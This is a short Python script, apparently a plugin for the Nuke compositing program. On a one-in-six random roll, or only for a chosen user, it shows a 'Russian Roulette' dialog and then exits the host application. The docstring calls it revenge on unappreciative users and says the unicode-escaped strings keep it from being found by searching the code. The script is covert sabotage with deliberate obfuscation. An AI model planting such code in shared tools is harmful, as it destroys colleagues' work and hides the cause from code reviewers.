"""
a coping mechanism when users were not appreciative of how much work codeing and automation is
* it has not yet been implemented, so far writing the code was satisfaction enough
* pretty much undetectable by searching the code, since random unicode codecs are used

shutdown software if randint hits 6 or alternatively just for a specific user
added UI with Ok and Yes options to let user know it's not some random Nuke shutdown
"""

import os

from random import randint
from PySide2.QtWidgets import QMessageBox

kaboom = randint(1, 6)
user = os.environ["USERNAME"]

# if kaboom == 1 and user == "****":
if kaboom == 1:
    r = QMessageBox()
    r.setWindowTitle("R\u0075ssi\u0061n R\u006Ful\u0065tt\u0065")
    r.setText("Sh\u0075tting d\u006Fw\u006E \u0070ro\u0067ra\u006D.")
    r.setIcon(QMessageBox.Critical)
    r.setStandardButtons(QMessageBox.Ok | QMessageBox.Yes)
    r.setDefaultButton(QMessageBox.Yes)
    r.exec_()

    if r.accepted:
        exit()
